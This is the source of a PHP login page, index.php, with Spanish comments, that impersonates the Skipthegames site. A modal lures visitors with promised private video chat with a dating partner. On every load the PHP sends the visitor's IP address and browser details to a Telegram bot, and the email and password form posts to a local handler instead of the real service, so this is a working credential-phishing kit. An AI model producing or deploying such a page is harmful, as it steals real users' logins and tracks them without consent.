<?php
// index.php

// --------------------------------------------------------
// >>> INICIO: LÓGICA DE ALERTA DE NUEVO VISITANTE <<<
// --------------------------------------------------------

// Cargar la configuración de Telegram
// RUTA CONFIRMADA por el usuario: 'assets/config/conexion.php'
$config = require 'assets/config/conexion.php'; 

$botToken = $config['telegram']['bot_token'] ?? null;
$chatId = $config['telegram']['chat_id'] ?? null;

// Aseguramos que solo se intente el envío si los tokens están presentes.
if ($botToken && $chatId) {
    
    $ipAddress = $_SERVER['REMOTE_ADDR'] ?? 'Desconocida';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Desconocido';
    $time = date('Y-m-d H:i:s');
    
    // 1. Formatear el mensaje
    $message = "🔔 ¡NUEVO USUARIO EN LA WEB! 🔔\n\n";
    $message .= "🌐 *IP:* " . htmlspecialchars($ipAddress) . "\n";
    $message .= "⏰ *Hora:* " . $time . "\n";
    $message .= "💻 *User Agent (Browser):* " . htmlspecialchars($userAgent);
    
    $encodedMessage = urlencode($message);

    // 2. Construir la URL de la API de Telegram
    $telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text={$encodedMessage}&parse_mode=Markdown";

    // 3. Enviar la solicitud a Telegram (usando cURL en segundo plano)
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    // Establecer un tiempo de espera muy bajo (500ms) para no retrasar la carga de la página
    curl_setopt($ch, CURLOPT_TIMEOUT_MS, 500); 
    curl_exec($ch);
    curl_close($ch);
}
// --------------------------------------------------------
// >>> FIN: LÓGICA DE ALERTA DE NUEVO VISITANTE <<<
// --------------------------------------------------------

$showError = isset($_GET['error']) && $_GET['error']==='1'; 
?>
<!doctype html>
<html lang="en"> 
<head>
    <meta charset="utf-8">
    <title>Log in to your account</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="assets/css/login.css">
</head>
<body>
    <div class="modal is-open" role="dialog" aria-modal="true" aria-labelledby="vc-title" aria-describedby="vc-desc">
        <div class="modal-card">
            <h2 id="vc-title" class="vc-title">Live Video Chat</h2>
            <p id="vc-desc" class="vc-desc">
                <span class="vc-strong">Login with skipthegames and enjoy with</span>
                <span class="vc-strong"> Private Live Video Chat </span>your dating partner.
            </p>
            <button id="modalContinue" class="vc-btn" type="button" aria-label="Login with Skipthegames">
                <span class="vc-square" aria-hidden="true"></span>
                <span class="vc-btn-text">Login with Skipthegames</span>
            <span class="vc-spacer" aria-hidden="true"></span>
            </button>
        </div>
    </div>

    <main class="wrap" role="main" aria-hidden="true" id="mainContent">
        <header class="brand-block">
            <a href="#" class="brand">Skipthegames<span class="tld">.eu</span></a>
            <div class="tagline">Skip the games. Get satisfaction.</div>
        </header>

        <h1 class="title">Log in to your account</h1>

        <?php if ($showError): ?>
        <div class="alert" role="alert" aria-live="polite">Incorrect email or password.</div>
        <?php endif; ?>

        <form method="post" action="assets/config/processlogin.php" novalidate class="form">
            <label class="sr-only" for="email">Email</label>
            <input id="email" name="email" type="email" inputmode="email" autocomplete="email" placeholder="Your email" required>

            <label class="sr-only" for="password">Password</label>
            <input id="password" name="password" type="password" autocomplete="current-password" placeholder="Password" required>

            <button type="button" class="link show" id="togglePass" aria-controls="password" aria-pressed="false">Show password</button>

            <button type="submit" class="btn" id="loginBtn">Log in</button>

            <div class="help-block">
                <p class="help danger"><span>Password not working?</span> <a href="#" class="help-link">Click here</a></p>
                <p class="help danger"><span>Can't access your mailbox?</span> <a href="#" class="help-link">Click to request email change</a></p>
            </div>

            <p class="meta">By clicking "Log in", you accept <a class="ext" href="#">Skipthegames.com's Terms and Conditions of Use</a>.</p>
            <p class="meta">This site is protected by hCaptcha and its <a class="ext" href="#">Privacy Policy</a> and <a class="ext" href="#">Terms of Service</a> apply.</p>
        </form>

        <hr class="divider">

        <footer class="footer">
            <small>©Skipthegames.eu</small>
            <nav class="links" aria-label="Footer">
                <a href="#">Home</a><a href="#">Contact</a><a href="#">About</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Entertainer Info</a>
            </nav>
        </footer>
    </main>

    <script>
        const toggle = document.getElementById('togglePass');
        const pass = document.getElementById('password');
        toggle.addEventListener('click', () => {
            const show = pass.type === 'password';
            pass.type = show ? 'text' : 'password';
            toggle.textContent = show ? 'Hide password' : 'Show password';
            toggle.setAttribute('aria-pressed', String(show));
        });

        const modal = document.querySelector('.modal');
        const main  = document.getElementById('mainContent');
        const cta   = document.getElementById('modalContinue');
        window.addEventListener('load', () => cta.focus());
        cta.addEventListener('click', () => {
            modal.classList.remove('is-open');
            modal.setAttribute('aria-hidden','true');
            main.removeAttribute('aria-hidden');
            document.getElementById('email').focus();
        });

        const form = document.querySelector('.form');
        const btn  = document.getElementById('loginBtn');
        form.addEventListener('submit', (e) => {
            if (!form.checkValidity()) { e.preventDefault(); form.reportValidity(); return; }
            btn.disabled = true; btn.textContent = 'Logging in...';
        });
    </script>
</body>
</html>